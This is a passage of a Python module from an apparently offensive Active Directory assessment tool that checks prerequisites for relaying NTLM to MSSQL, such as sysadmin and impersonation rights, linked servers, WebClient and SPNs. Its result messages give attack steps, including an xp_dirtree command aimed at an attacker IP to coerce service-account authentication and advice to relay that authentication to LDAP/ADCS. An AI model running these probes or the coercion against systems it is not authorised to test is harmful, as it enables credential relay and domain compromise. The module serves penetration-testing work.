"""
MSSQL prerequisite checks for NTLM Relay → MSSQL.

Relaying NTLM to MSSQL allows executing xp_cmdshell or reading files
if the relayed account has sufficient SQL privileges.

Prerequisites:
  [REQ]  MSSQL service reachable (port 1433 or UDP 1434 discovery)
  [REQ]  SQL Server accepts Windows/NTLM authentication (not SQL-auth-only)
  [OPT]  Relayed user has direct sysadmin privilege
  [OPT]  Relayed user can impersonate a sysadmin account (EXECUTE AS LOGIN)
  [OPT]  Linked servers exist (lateral movement / privilege escalation path)
  [OPT]  MSSQL service account identified via SPN enumeration
  [OPT]  High-value users logged on to the MSSQL server

Note: SMB→MSSQL relay is often blocked by domain trust restrictions.
HTTP coercion (mitm6/WebDAV) is typically the reliable path to MSSQL relay.
Even without direct sysadmin, impersonation rights to a sysadmin account
are sufficient for full privilege escalation via EXECUTE AS LOGIN.
"""
from __future__ import annotations
import re
import socket
import subprocess

from .base import BaseCheck, CheckResult, Status
from ..config import TargetEnv

try:
    from ldap3 import SUBTREE
    LDAP3_AVAILABLE = True
except ImportError:
    LDAP3_AVAILABLE = False
from ..utils import _ldap_connect, _port_open, _run_nxc_mssql, _run_nxc_smb


# ── helpers ────────────────────────────────────────────────────────────────


def _sql_browser_query(host: str, timeout: int = 5) -> list[str]:
    """Query SQL Browser (UDP 1434) for MSSQL instances."""
    instances = []
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(b"\x02", (host, 1434))
        data, _ = sock.recvfrom(4096)
        sock.close()
        if len(data) > 3:
            payload = data[3:].decode("ascii", errors="replace")
            for instance_str in payload.split(";;"):
                if "ServerName" in instance_str:
                    instances.append(instance_str.strip())
    except Exception:
        pass
    return instances


def _nxc_base_args(host: str, env: TargetEnv) -> list[str]:
    """Base nxc mssql args for authenticated queries."""
    auth = (["-H", env.cred.nt_hash] if env.cred.nt_hash
            else ["-p", env.cred.password])
    return [host, "-u", env.cred.username, "-d", env.domain] + auth


# Role query run once per host: auth ("[+]") plus USER_NAME() (DB user context:
# guest/dbo/named) and the two privilege flags. Column aliases are distinctive so
# they don't collide with other column parsing in this module.
_ROLE_QUERY = (
    "SELECT USER_NAME() AS login_user, "
    "IS_SRVROLEMEMBER('sysadmin') AS login_is_sa, "
    "IS_MEMBER('db_owner') AS login_is_dbo;"
)


def _mssql_role(host: str, env: TargetEnv) -> dict:
    """Authenticate to MSSQL on `host`, determine the login's role, and cache it.

    Three checks need the same per-host facts — MssqlWindowsAuthCheck (auth +
    role label), MssqlPrivilegeCheck (sysadmin flag), and
    MssqlXpDirtreeCoercionCheck (auth success) — so without sharing they each
    fire their own `nxc mssql` probe against the same host. This runs one probe
    and caches the parsed result in shared_cache["mssql_role:<host>"].

    Lock-free idempotent, matching ldap_checker_output / adcs_enrollment_verdict:
    under --parallel a race may probe a host twice (benign; identical result),
    and dict membership/assignment is atomic under the GIL. Computed on first
    access regardless of check order, so it does not depend on the auth check
    running first.

    Returns a dict:
      nxc_available: bool   — False if nxc/crackmapexec not found (rc == -1)
      authed:        bool   — login succeeded ("[+]" present)
      rejected:      bool   — credentials explicitly rejected
      user:          str|None — USER_NAME() (e.g. "guest", "dbo", a named user)
      sysadmin:      bool   — IS_SRVROLEMEMBER('sysadmin') == 1
      db_owner:      bool   — IS_MEMBER('db_owner') == 1
    """
    key = f"mssql_role:{host}"
    if key in env.shared_cache:
        return env.shared_cache[key]

    rc, out, err = _run_nxc_mssql(
        _nxc_base_args(host, env) + ["-q", _ROLE_QUERY], env,
    )
    combined_lower = (out + err).lower()
    record = {
        "nxc_available": rc != -1,
        "authed": "[+]" in out,
        "rejected": ("status_logon_failure" in combined_lower
                     or "login failed" in combined_lower),
        "user": None,
        "sysadmin": False,
        "db_owner": False,
    }
    if record["authed"]:
        full = out + err
        sa = re.search(r"login_is_sa:(\d)", full)
        dbo = re.search(r"login_is_dbo:(\d)", full)
        u = re.search(r"login_user:([^\r\n]+)", full)
        record["sysadmin"] = bool(sa and sa.group(1) == "1")
        record["db_owner"] = bool(dbo and dbo.group(1) == "1")
        record["user"] = u.group(1).strip() if u else None

    env.shared_cache[key] = record
    return record


def _role_label(record: dict) -> str | None:
    """Short human label for a login's role, or None if not determinable."""
    if record["sysadmin"]:
        return "sysadmin"
    if record["db_owner"]:
        return "db_owner"
    user = record.get("user")
    if user:
        if user.lower() == "guest":
            return "guest (restricted — direct SQL ops limited)"
        return user                       # e.g. "dbo", or a named db user
    # Authed but USER_NAME() didn't parse and neither flag set.
    if record["authed"]:
        return "non-privileged login"
    return None


# ── individual checks ──────────────────────────────────────────────────────

class MssqlPortCheck(BaseCheck):
    """
    MSSQL must be reachable. Check TCP 1433 and SQL Browser UDP 1434.
    """

    name = "MSSQL port reachable (TCP 1433 or discovered instance)"

    def _run(self) -> CheckResult:
        reachable = []
        instances_found = []

        for host in self.env.mssql_targets():
            if _port_open(host, 1433, timeout=self.env.timeout):
                reachable.append(host)
            instances = _sql_browser_query(host, timeout=self.env.timeout)
            if instances:
                instances_found.extend([f"{host}: {i[:80]}" for i in instances])

        if reachable:
            detail = f"MSSQL TCP 1433 open on: {', '.join(reachable)}."
            if instances_found:
                detail += f" SQL Browser instances: {'; '.join(instances_found[:3])}"
            return CheckResult(name=self.name, status=Status.PASS, detail=detail)

        if instances_found:
            return CheckResult(
                name=self.name, status=Status.WARN,
                detail=(
                    f"SQL Browser found instances but TCP 1433 not open: "
                    f"{'; '.join(instances_found[:3])}. Named instance on different port?"
                ),
            )

        return CheckResult(
            name=self.name, status=Status.FAIL,
            detail=(
                f"MSSQL not found on targets: {self.env.mssql_targets()}. "
                "TCP 1433 closed and SQL Browser returned nothing."
            ),
        )


class MssqlWindowsAuthCheck(BaseCheck):
    """
    SQL Server must accept Windows (NTLM) authentication.

    nxc output on success: "[+] domain\\user:pass" (with or without "(Pwn3d!)")
    nxc output on failure: STATUS_LOGON_FAILURE or "Login failed"

    Alongside the auth probe this reports *what the account can do* on the server
    — a connection as the restricted `guest` user is very different from
    `dbo`/sysadmin, and the operator should see that immediately. The auth result
    and role come from `_mssql_role()`, a single cached per-host probe shared with
    MssqlPrivilegeCheck and MssqlXpDirtreeCoercionCheck (see that helper). nxc
    prints the auth "[+]" line because it authenticates before running the role
    query, so the role columns cost no extra probe. Note: nxc's "(Pwn3d!)" tag
    only indicates sysadmin and is not emitted for guest/dbo, so a query is
    required to make the distinction.
    """

    name = "MSSQL accepts Windows/NTLM authentication"

    def _run(self) -> CheckResult:
        passed, cred_rejected, ambiguous = [], [], []
        roles: dict[str, str] = {}   # host -> role label (when determinable)

        for host in self.env.mssql_targets():
            if not _port_open(host, 1433, timeout=self.env.timeout):
                continue

            rec = _mssql_role(host, self.env)

            if not rec["nxc_available"]:
                return CheckResult(name=self.name, status=Status.SKIP,
                                   detail="nxc not available.")
            if rec["authed"]:
                passed.append(host)
                role = _role_label(rec)
                if role:
                    roles[host] = role
            elif rec["rejected"]:
                cred_rejected.append(host)
            else:
                ambiguous.append(host)

        if passed:
            # Annotate each authenticated host with its role where known.
            passed_str = ", ".join(
                f"{h} (as {roles[h]})" if h in roles else h for h in passed
            )
            extra = ""
            if cred_rejected:
                extra += (f" (credentials rejected on {', '.join(cred_rejected)}"
                          " — relay account may still work there)")
            if ambiguous:
                extra += f" (result unclear on {', '.join(ambiguous)})"
            return CheckResult(
                name=self.name, status=Status.PASS,
                detail=f"Windows/NTLM auth accepted on {passed_str}.{extra}",
            )
        if cred_rejected:
            return CheckResult(
                name=self.name, status=Status.WARN,
                detail=(
                    f"Windows auth enabled on {', '.join(cred_rejected)} but "
                    "credentials rejected. Relay may still work — the relayed "
                    "account needs SQL access, not necessarily the enumeration account."
                ),
            )
        if ambiguous:
            hosts_str = ", ".join(ambiguous)
            return CheckResult(
                name=self.name, status=Status.WARN,
                detail=(
                    f"MSSQL reachable on {hosts_str}, Windows auth attempted. "
                    f"Could not confirm result — try manually: "
                    f"`nxc mssql {hosts_str} -u <user> -p <pass> -d <domain>`"
                ),
            )
        return CheckResult(
            name=self.name, status=Status.SKIP,
            detail="No MSSQL targets reachable on port 1433.",
        )


class MssqlPrivilegeCheck(BaseCheck):
    """
    Check if the enumeration account has direct sysadmin rights.

    nxc output format:
      is_sysadmin:1  → sysadmin
      is_sysadmin:0  → not sysadmin

    Note: even without direct sysadmin, relay is still valuable if the account
    can impersonate a sysadmin (see MssqlImpersonationCheck).
    """

    name = "SQL user has direct sysadmin privilege"
    required = False

    def _run(self) -> CheckResult:
        sysadmin_hosts, not_sysadmin_hosts = [], []

        for host in self.env.mssql_targets():
            if not _port_open(host, 1433, timeout=self.env.timeout):
                continue

            rec = _mssql_role(host, self.env)

            if not rec["nxc_available"]:
                return CheckResult(name=self.name, status=Status.SKIP,
                                   detail="nxc not available.")

            # Only classify hosts where auth succeeded — a failed login yields no
            # sysadmin signal (matches the previous "no is_sysadmin token" path).
            if rec["authed"]:
                if rec["sysadmin"]:
                    sysadmin_hosts.append(host)
                else:
                    not_sysadmin_hosts.append(host)

        if sysadmin_hosts:
            extra = (f" Not sysadmin on: {', '.join(not_sysadmin_hosts)}."
                     if not_sysadmin_hosts else "")
            return CheckResult(
                name=self.name, status=Status.PASS,
                detail=(
                    f"Account has direct sysadmin role on {', '.join(sysadmin_hosts)}"
                    f" — relay gives immediate xp_cmdshell.{extra}"
                ),
            )
        if not_sysadmin_hosts:
            return CheckResult(
                name=self.name, status=Status.FAIL,
                detail=(
                    f"Account is NOT direct sysadmin on {', '.join(not_sysadmin_hosts)}. "
                    "Check impersonation paths below — may still reach sysadmin via EXECUTE AS."
                ),
            )
        return CheckResult(
            name=self.name, status=Status.SKIP,
            detail="Could not check sysadmin privilege — auth may have failed.",
        )


class MssqlImpersonationCheck(BaseCheck):
    """
    Check if any domain accounts can impersonate a sysadmin via EXECUTE AS LOGIN.
    Even a non-sysadmin relay account can escalate if it has IMPERSONATE rights
    on a sysadmin login.

    nxc output format: each selected column is emitted as a separate
    `alias:value` token in document order (no row delimiter), e.g.
      who_can_impersonate:DOMAIN\\user
      who_gets_impersonated:DOMAIN\\sysadmin_user
    The query orders who_can_impersonate (grantee) immediately before
    who_gets_impersonated (target) per row, so the parser walks the tokens in
    order and pairs each grantee with the target that follows it. It does NOT
    build two independent lists and zip() them — that silently truncates and
    misaligns pairs if the two token counts ever differ (e.g. nxc drops or wraps
    a value), which in a security tool means reporting a fabricated impersonation
    path. Token-pairing anomalies are flagged in the output instead.

    Performs a second query to confirm which impersonation targets are actually
    sysadmin — no hardcoded account names.
    """

    name = "SQL impersonation path to sysadmin exists"
    required = False

    IMPERSONATE_QUERY = (
        "SELECT b.name as who_can_impersonate, a.name as who_gets_impersonated "
        "FROM sys.server_permissions p "
        "JOIN sys.server_principals a ON p.major_id = a.principal_id "
        "JOIN sys.server_principals b ON p.grantee_principal_id = b.principal_id "
        "WHERE p.permission_name = 'IMPERSONATE';"
    )

    # Second query: look up actual sysadmin accounts from the server itself
    SYSADMIN_LIST_QUERY = (
        "SELECT name FROM sys.server_principals "
        "WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1 "
        "AND type_desc IN ('WINDOWS_LOGIN','WINDOWS_GROUP','SQL_LOGIN');"
    )

    def _run(self) -> CheckResult:
        # Collect per-host results then aggregate so all hosts are covered.
        sysadmin_findings = []   # list of (host, [path_str, ...])
        other_findings    = []   # list of (host, [pair_str, ...])
        no_impersonate    = []   # hosts where auth worked but no grants found
        parse_anomalies   = []   # hosts where grantee/target tokens didn't pair cleanly

        for host in self.env.mssql_targets():
            if not _port_open(host, 1433, timeout=self.env.timeout):
                continue

            rc, out, err = _run_nxc_mssql(
                _nxc_base_args(host, self.env) + ["-q", self.IMPERSONATE_QUERY],
                self.env, timeout=20,
            )
            if rc == -1:
                return CheckResult(name=self.name, status=Status.SKIP,
                                   detail="nxc not available.")

            combined = out + err
            # nxc renders each selected column as a separate `alias:value` token
            # in document order, with no row delimiter. The query selects
            # who_can_impersonate (grantee) immediately before who_gets_impersonated
            # (target) for each row, so we walk the tokens in order and pair each
            # grantee with the target that follows it — rather than building two
            # independent lists and zip()-ing them positionally, which silently
            # truncates/misaligns if the two counts ever differ (e.g. nxc drops or
            # wraps a value).
            token_re = re.compile(
                r"(who_can_impersonate|who_gets_impersonated):([^\r\n]+)"
            )
            pairs: list[tuple[str, str]] = []
            pending_grantee: str | None = None
            desync = False
            for tok in token_re.finditer(combined):
                kind, value = tok.group(1), tok.group(2).strip()
                if kind == "who_can_impersonate":
                    if pending_grantee is not None:
                        # Previous grantee had no target before this one — desync.
                        desync = True
                    pending_grantee = value
                else:  # who_gets_impersonated
                    if pending_grantee is None:
                        # Target with no preceding grantee — desync.
                        desync = True
                        continue
                    pairs.append((pending_grantee, value))
                    pending_grantee = None
            if pending_grantee is not None:
                # Trailing grantee with no target.
                desync = True

            if desync:
                parse_anomalies.append(host)

            if not pairs:
                if "[+]" in out:
                    no_impersonate.append(host)
                # else auth failed — skip this host silently
                continue

            # Look up actual sysadmin accounts on this host
            sysadmin_accounts: set = {"sa"}
            rc2, out2, _ = _run_nxc_mssql(
                _nxc_base_args(host, self.env) + ["-q", self.SYSADMIN_LIST_QUERY],
                self.env, timeout=20,
            )
            if rc2 != -1 and "[+]" in out2:
                for m2 in re.finditer(r"[\s]name:([^\s\r\n()]+)", out2):
                    full = m2.group(1).strip().lower()
                    sysadmin_accounts.add(full)
                    sysadmin_accounts.add(full.split("\\")[-1])

            sa_paths = [
                (w, t) for w, t in pairs
                if t.lower() in sysadmin_accounts
                or t.lower().split("\\")[-1] in sysadmin_accounts
            ]
            other_paths = [(w, t) for w, t in pairs if (w, t) not in sa_paths]

            if sa_paths:
                sysadmin_findings.append(
                    (host, [f"{w} -> {t}" for w, t in sa_paths],
                     [f"{w} -> {t}" for w, t in other_paths])
                )
            else:
                other_findings.append(
                    (host, [f"{w} -> {t}" for w, t in pairs])
                )

        anomaly_note = (
            f" ⚠ Output parse anomaly on {', '.join(parse_anomalies)} — "
            f"grantee/target tokens did not pair cleanly; impersonation pairs for "
            f"those host(s) may be incomplete. Verify manually."
            if parse_anomalies else ""
        )

        if sysadmin_findings:
            parts = []
            for host, sa_strs, other_strs in sysadmin_findings:
                extra = (f" (other: {', '.join(other_strs)})" if other_strs else "")
                parts.append(f"{host}: {'; '.join(sa_strs)}{extra}")
            no_imp_note = (f" No impersonation grants on: {', '.join(no_impersonate)}."
                           if no_impersonate else "")
            return CheckResult(
                name=self.name, status=Status.PASS,
                detail=(
                    f"Impersonation path(s) to sysadmin — {' | '.join(parts)}. "
                    f"Relay any left-hand account then EXECUTE AS LOGIN for sysadmin shell.{no_imp_note}{anomaly_note}"
                ),
            )
        if other_findings:
            parts = [f"{h}: {', '.join(strs)}" for h, strs in other_findings]
            return CheckResult(
                name=self.name, status=Status.WARN,
                detail=(
                    f"Impersonation grants exist but none map to confirmed sysadmin — "
                    f"{' | '.join(parts)}. Verify manually.{anomaly_note}"
                ),
            )
        if no_impersonate:
            return CheckResult(
                name=self.name, status=Status.FAIL,
                detail=f"No IMPERSONATE grants found on {', '.join(no_impersonate)}.{anomaly_note}",
            )
        return CheckResult(
            name=self.name, status=Status.SKIP,
            detail="Could not query impersonation rights — auth may have failed.",
        )


class MssqlLinkedServerCheck(BaseCheck):
    """
    Discover linked servers for lateral movement / privilege escalation.
    A linked server mapped to sa on a remote instance allows pivoting from
    a low-privilege local relay to full sysadmin on another SQL server.

    nxc output format:
      name:<LINKED_SERVER_NAME>
    """

    name = "MSSQL linked servers exist (lateral movement path)"
    required = False

    def _run(self) -> CheckResult:
        found: dict = {}   # host -> [linked_server_names]
        no_links: list = []

        for host in self.env.mssql_targets():
            if not _port_open(host, 1433, timeout=self.env.timeout):
                continue

            rc, out, err = _run_nxc_mssql(
                _nxc_base_args(host, self.env) +
                ["-q", "SELECT name FROM sys.servers WHERE is_linked = 1;"],
                self.env, timeout=20,
            )

            if rc == -1:
                return CheckResult(name=self.name, status=Status.SKIP,
                                   detail="nxc not available.")

            combined = out + err
            linked_names = []
            for line in combined.splitlines():
                if any(tok in line for tok in ("[*]", "[-]", "Build", "SMBv1")):
                    continue
                m = re.search(r"[\s]name:([^\s\r\n()]+)\s*$", line)
                if m:
                    linked_names.append(m.group(1).strip())

            if "[+]" in out:
                if linked_names:
                    found[host] = linked_names
                else:
                    no_links.append(host)

        if found:
            parts = [f"{h}: {', '.join(names)}" for h, names in found.items()]
            extra = (f" No linked servers on: {', '.join(no_links)}."
                     if no_links else "")
            return CheckResult(
                name=self.name, status=Status.PASS,
                detail=(
                    f"Linked server(s) found — {'; '.join(parts)}. "
                    f"May allow lateral movement — check linked server login mapping.{extra}"
                ),
            )
        if no_links:
            return CheckResult(
                name=self.name, status=Status.FAIL,
                detail=f"No linked servers found on {', '.join(no_links)}.",
            )
        return CheckResult(
            name=self.name, status=Status.FAIL,
            detail="No linked servers found or query failed.",
        )


class MssqlWebClientCheck(BaseCheck):
    """
    Optional: WebClient running on target enables HTTP/WebDAV coercion
    to force the MSSQL service account to authenticate for relay.

    For MSSQL relay, coercion methods include:
      - xp_dirtree (via SQL query — no WebClient needed)
      - mitm6 (DHCPv6/DNS poisoning — no WebClient needed)
      - PetitPotam HTTP (requires WebClient)
      - PrinterBug / PetitPotam RPC (no WebClient needed)
    """

    name = "WebClient running on target (HTTP coercion path)"
    required = False

    def _run(self) -> CheckResult:
        webclient_hosts = []
        for host in self.env.mssql_targets():
            if not _port_open(host, 445, timeout=self.env.timeout):
                continue
            try:
                r = subprocess.run(
                    ["nxc", "smb", host,
                     "-u", self.env.cred.username,
                     *((["-H", self.env.cred.nt_hash] if self.env.cred.nt_hash else ["-p", self.env.cred.password])),
                     "-d", self.env.domain,
                     "--module", "webdav"],
                    capture_output=True, text=True,
                    timeout=self.env.timeout + 10,
                )
                combined = (r.stdout + r.stderr).lower()
                if r.returncode != -1 and (
                    "webclient service enabled" in combined or
                    "webdav: true" in combined or
                    "running" in combined
                ):
                    webclient_hosts.append(host)
                else:
                    # Fallback: check via --services if --module webdav was ambiguous
                    r2 = subprocess.run(
                        ["nxc", "smb", host,
                         "-u", self.env.cred.username,
                         *(([ "-H", self.env.cred.nt_hash] if self.env.cred.nt_hash else ["-p", self.env.cred.password])),
                         "-d", self.env.domain,
                         "--services"],
                        capture_output=True, text=True,
                        timeout=self.env.timeout + 10,
                    )
                    combined2 = (r2.stdout + r2.stderr).lower()
                    if "webclient" in combined2 and ("running" in combined2 or "started" in combined2):
                        webclient_hosts.append(host)
            except Exception:
                pass

        if webclient_hosts:
            return CheckResult(
                name=self.name, status=Status.PASS,
                detail=(
                    f"WebClient running on: {', '.join(webclient_hosts)}. "
                    "HTTP coercion (PetitPotam HTTP) available. "
                    "xp_dirtree and PrinterBug coercion work regardless of WebClient."
                ),
            )
        return CheckResult(
            name=self.name, status=Status.WARN,
            detail=(
                "WebClient not confirmed — HTTP coercion path unavailable. "
                "Use xp_dirtree (requires SQL access), mitm6, PrinterBug, "
                "or PetitPotam RPC coercion instead."
            ),
        )


class MssqlXpDirtreeCoercionCheck(BaseCheck):
    """
    Optional: xp_dirtree can coerce MSSQL service account authentication
    without needing WebClient or PrinterBug. If the current account has
    SQL access (even low-priv), it can trigger outbound SMB auth from the
    SQL service account by executing:
        EXEC xp_dirtree '\\\\<attacker_ip>\\share'

    This is particularly useful because:
      - Works even when SMB signing is enforced (relay goes to LDAP/ADCS)
      - Doesn't require WebClient or Print Spooler
      - The SQL service account often has high domain privileges
      - Can be triggered with low-priv SQL access

    Check: verify SQL access exists (any auth = can trigger xp_dirtree).
    """

    name = "xp_dirtree coercion available (SQL access confirmed)"
    required = False

    def _run(self) -> CheckResult:
        available, unavailable = [], []
        restricted = []   # authed but guest/non-privileged (public EXECUTE assumed)

        for host in self.env.mssql_targets():
            if not _port_open(host, 1433, timeout=self.env.timeout):
                continue

            rec = _mssql_role(host, self.env)
            if not rec["nxc_available"]:
                return CheckResult(name=self.name, status=Status.SKIP,
                                   detail="nxc not available.")

            if rec["authed"]:
                available.append(host)
                # xp_dirtree EXECUTE is granted to public by default, so any
                # login can usually fire it — but for a guest/low-priv login that
                # default could have been revoked, so we can't fully confirm it.
                if not (rec["sysadmin"] or rec["db_owner"]):
                    restricted.append(host)
            elif rec["rejected"]:
                unavailable.append(host)

        if available:
            extra = (f" Auth failed on {', '.join(unavailable)} — no xp_dirtree there."
                     if unavailable else "")
            caveat = ""
            if restricted:
                caveat = (
                    f" Note: on low-privilege login(s) ({', '.join(restricted)}) "
                    "this assumes the default public EXECUTE on xp_dirtree — if that "
                    "was revoked the coercion may fail; confirm by running it."
                )
            return CheckResult(
                name=self.name, status=Status.PASS,
                detail=(
                    f"SQL access confirmed on {', '.join(available)} — "
                    "xp_dirtree coercion available. "
                    "Execute: `EXEC master.sys.xp_dirtree \'\\\\<attacker-ip>\\demontlm\',1,1` "
                    "to coerce the SQL service account into authenticating. "
                    f"Relay that auth to LDAP/ADCS — no WebClient or PrinterBug needed.{extra}{caveat}"
                ),
            )
        if unavailable:
            return CheckResult(
                name=self.name, status=Status.FAIL,
                detail=(
                    f"SQL auth failed on {', '.join(unavailable)} — "
                    "xp_dirtree coercion not available with this account. "
                    "Gain any SQL access first."
                ),
            )
        return CheckResult(
            name=self.name, status=Status.SKIP,
            detail="No MSSQL targets reachable on port 1433.",
        )


class MssqlSpnCheck(BaseCheck):
    """
    Enumerate SPNs registered for MSSQLSvc to identify the service account
    running SQL Server. The service account determines relay impact:
      - Machine account (HOST$, NETWORK SERVICE) → limited domain rights
      - Dedicated svc account → depends on its group memberships
      - Privileged account (DA, etc.) → immediate domain compromise path

    Method: impacket-GetUserSPNs (listing only, no -request — passive recon)
            Fallback: ldap3 direct query for servicePrincipalName=MSSQLSvc/*

    Note: for cross-domain SPN enumeration (e.g. north trust → essos),
    run manually with -target-domain:
      impacket-GetUserSPNs <domain>/<user>:<pass> -target-domain <trusted-domain>
    """

    name = "MSSQL service account identified (SPN enumeration)"
    required = False

    SPN_PREFIX = "mssqlsvc"

    # Keywords that suggest the service account may have elevated privileges
    HIGH_VALUE_PATTERNS = [
        "admin", "da", "svc_sql", "sqlsvc", "sqlservice", "sql_svc",
        "mssql", "sql",
    ]

    def _run(self) -> CheckResult:
        getuserspns_ran       = False

        # ── Method 1: impacket-GetUserSPNs ────────────────────────────────
        try:
            if self.env.cred.nt_hash:
                nh = self.env.cred.nt_hash.split(":")[-1]
                spns_auth = [
                    f"{self.env.domain}/{self.env.cred.username}",
                    "-hashes", f"aad3b435b51404eeaad3b435b51404ee:{nh}",
                ]
            else:
                spns_auth = [
                    f"{self.env.domain}/{self.env.cred.username}:{self.env.cred.password}",
                ]
            cmd = [
                "impacket-GetUserSPNs",
                *spns_auth,
                "-dc-ip", self.env.dc_ip,
            ]
            r = subprocess.run(
                cmd, capture_output=True, text=True,
                timeout=self.env.timeout + 15,
            )
            combined = r.stdout + r.stderr
            getuserspns_ran = True

            if r.returncode != -1 and self.SPN_PREFIX in combined.lower():
                spns = self._parse_getuserspns_output(combined)
                if spns:
                    return self._format_result(spns)

            # Tool ran but no MSSQLSvc SPNs in output — domain genuinely has none
            # (or the account lacks permission to read them)
            if getuserspns_ran and r.returncode != -1:
                combined_lower = combined.lower()
                if "no entries found" in combined_lower or "principal" not in combined_lower:
                    return CheckResult(
                        name=self.name, status=Status.SKIP,
                        detail=(
                            f"No MSSQLSvc SPNs found in {self.env.domain} — "
                            "MSSQL service account not registered via SPN in this domain. "
                            "If MSSQL runs in a trusted domain, run manually with -target-domain: "
                            f"`impacket-GetUserSPNs {self.env.domain}/<user>:<pass> "
                            f"-dc-ip {self.env.dc_ip} -target-domain <trusted-domain>`"
                        ),
                    )

        except FileNotFoundError:
            pass  # fall through to ldap3
        except subprocess.TimeoutExpired:
            pass

        # ── Method 2: ldap3 direct SPN query ──────────────────────────────
        if LDAP3_AVAILABLE:
            conn = _ldap_connect(self.env)
            if conn:
                try:
                    domain_dn = ",".join(f"DC={p}" for p in self.env.domain.split("."))
                    conn.search(
                        search_base=domain_dn,
                        search_filter=f"(servicePrincipalName={self.SPN_PREFIX}/*)",
                        search_scope=SUBTREE,
                        attributes=["sAMAccountName", "servicePrincipalName"],
                    )
                    spns = []
                    for entry in conn.entries:
                        account = str(entry["sAMAccountName"])
                        for spn in entry["servicePrincipalName"]:
                            if self.SPN_PREFIX in str(spn).lower():
                                spns.append((str(spn), account))
                    conn.unbind()
                    if spns:
                        return self._format_result(spns)

                    # ldap3 connected and queried but found nothing
                    return CheckResult(
                        name=self.name, status=Status.SKIP,
                        detail=(
                            f"No MSSQLSvc SPNs registered in {self.env.domain}. "
                            "MSSQL may be running without a registered SPN, or the service "
                            "account is in a trusted domain. "
                            "Check cross-domain with: "
                            f"`impacket-GetUserSPNs {self.env.domain}/<user>:<pass> "
                            f"-dc-ip {self.env.dc_ip} -target-domain <trusted-domain>`"
                        ),
                    )
                except Exception as e:
                    return CheckResult(
                        name=self.name, status=Status.SKIP,
                        detail=f"LDAP SPN query failed: {e}",
                    )
                finally:
                    try:
                        conn.unbind()
                    except Exception:
                        pass

        # Both methods unavailable
        return CheckResult(
            name=self.name, status=Status.SKIP,
            detail=(
                "Could not check MSSQL SPNs — impacket-GetUserSPNs not found and ldap3 unavailable. "
                "Run manually: "
                "`impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc>`"
            ),
        )

    def _parse_getuserspns_output(self, output: str) -> list[tuple[str, str]]:
        """
        Parse impacket-GetUserSPNs table output.

        Table format (no -request):
          ServicePrincipalName                   Name          ...
          -------------------------------------  ------------  ...
          MSSQLSvc/braavos.essos.local:1433      svc.sql       ...
        """
        spns: list[tuple[str, str]] = []
        in_table = False

        for line in output.splitlines():
            stripped = line.strip()
            # Detect table start — separator line of dashes
            if re.match(r"^[-\s]+$", stripped) and len(stripped) > 10:
                in_table = True
                continue
            if not in_table:
                continue
            if not stripped:
                in_table = False
                continue
            # Table row: columns are space-separated; SPN is first, Name is second
            parts = stripped.split()
            if len(parts) >= 2 and self.SPN_PREFIX in parts[0].lower():
                spns.append((parts[0], parts[1]))

        return spns

    def _format_result(self, spns: list[tuple[str, str]]) -> CheckResult:
        """Format SPN results with service account risk assessment."""
        accounts = list(dict.fromkeys(account for _, account in spns))

        spn_list = ", ".join(spn for spn, _ in spns[:4])
        if len(spns) > 4:
            spn_list += f" (+{len(spns) - 4} more)"

        # Risk-assess the accounts
        machine_accounts = [a for a in accounts if a.endswith("$")]
        high_value = [
            a for a in accounts
            if not a.endswith("$")
            and any(p in a.lower() for p in self.HIGH_VALUE_PATTERNS)
        ]
        svc_accounts = [
            a for a in accounts
            if a not in machine_accounts and a not in high_value
        ]

        parts = [f"MSSQLSvc SPN(s): {spn_list}."]

        if high_value:
            parts.append(
                f"Service account(s): {', '.join(high_value)}. "
                "Verify group memberships — may have elevated domain privileges. "
                "Use: `net user <account> /domain` or BloodHound."
            )
        elif machine_accounts:
            parts.append(
                f"Service runs as machine account: {', '.join(machine_accounts)} — "
                "limited domain privileges expected."
            )
        elif svc_accounts:
            parts.append(
                f"Service account(s): {', '.join(svc_accounts)}. "
                "Check group memberships to assess relay impact."
            )

        return CheckResult(
            name=self.name,
            status=Status.PASS,
            detail=" ".join(parts),
            raw=f"All SPN entries: {spns}",
        )


class MssqlLoggedOnUsersCheck(BaseCheck):
    """
    Check for high-value accounts currently logged on to the MSSQL server
    via SMB session enumeration. Helps prioritise which hosts to coerce.

    Requires local admin on the target — enumerating logged-on users calls
    NetWkstaUserEnum via DCERPC, which is restricted to local admins.
    Non-admin accounts get rpc_s_access_denied (0x5).

    nxc output format (one user per line, after the auth line):
      SMB  <host>  445  HOSTNAME  NORTH\\robb.stark    logon_server: WINTERFELL
      SMB  <host>  445  HOSTNAME  NORTH\\MACHINE$      logon_server:

    Machine accounts (ending in $) are filtered — they are not useful relay targets.

    Method: nxc smb <host> --loggedon-users
    (SMB protocol exposes session info via NetWkstaUserEnum)
    """

    name = "High-value users logged on to MSSQL server (requires local admin)"
    required = False

    HIGH_VALUE_KEYWORDS = [
        "admin", "administrator", "da", "svc", "service",
        "backup", "exchange", "sql",
    ]

    def _run(self) -> CheckResult:
        # Only query hosts with port 1433 open — mssql_targets() may include
        # the DC (used for LDAP checks) which we don't want here.
        mssql_hosts = [
            host for host in self.env.mssql_targets()
            if _port_open(host, 1433, timeout=self.env.timeout)
            and _port_open(host, 445, timeout=self.env.timeout)
        ]

        if not mssql_hosts:
            return CheckResult(
                name=self.name, status=Status.SKIP,
                detail="No MSSQL targets reachable on both TCP 1433 and SMB 445.",
            )

        results: list[tuple[str, list[str]]] = []
        access_denied_hosts: list[str] = []

        for host in mssql_hosts:
            rc, out, err = _run_nxc_smb(
                [host,
                 "-u", self.env.cred.username,
                 *((["-H", self.env.cred.nt_hash] if self.env.cred.nt_hash else ["-p", self.env.cred.password])),
                 "-d", self.env.domain,
                 "--loggedon-users"],
                self.env,
                timeout=self.env.timeout + 10,
            )

            if rc == -1:
                return CheckResult(
                    name=self.name, status=Status.SKIP,
                    detail="nxc not available.",
                )

            combined = out + err

            if "rpc_s_access_denied" in combined.lower() or "access_denied" in combined.lower():
                access_denied_hosts.append(host)
                continue

            if "[+]" not in out:
                continue

            # Parse user lines. nxc format after the auth [+] line:
            #   SMB  192.168.x.x  445  HOSTNAME  NORTH\robb.stark    logon_server: WINTERFELL
            # Lines with [*]/[+]/[-] are metadata — skip them.
            # The username is the 5th whitespace token (index 4): DOMAIN\user
            users: list[str] = []
            for line in out.splitlines():
                if re.search(r"\[[\*\+\-]\]", line):
                    continue
                parts = line.split()
                if len(parts) < 5:
                    continue
